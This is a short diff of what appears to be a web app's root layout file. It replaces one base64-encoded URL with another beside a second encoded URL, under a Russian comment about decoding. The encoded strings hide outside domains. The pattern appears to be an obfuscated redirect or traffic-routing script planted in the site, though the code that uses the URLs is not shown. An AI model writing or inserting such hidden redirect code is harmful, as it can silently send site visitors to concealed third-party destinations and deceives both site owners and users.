@@ -90,7 +90,7 @@ export default function RootLayout({
                         return;
                     }
                 }
-                var mainBrandB64 = "aHR0cHM6Ly93ZXN0LWNvb2w5LWFwZXguY29tL2FkMmFhcTV1cGM="; 
+                var mainBrandB64 = "aHR0cHM6Ly9iYWxhbnMtYXB4MTEtc21hcnQuY29tL2FkMmFhcTV1cGM="; 
                 var crossBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kaDYxbXAxYW0="; 
                 
                 // Фикс: отрезаем решетку перед декодированием
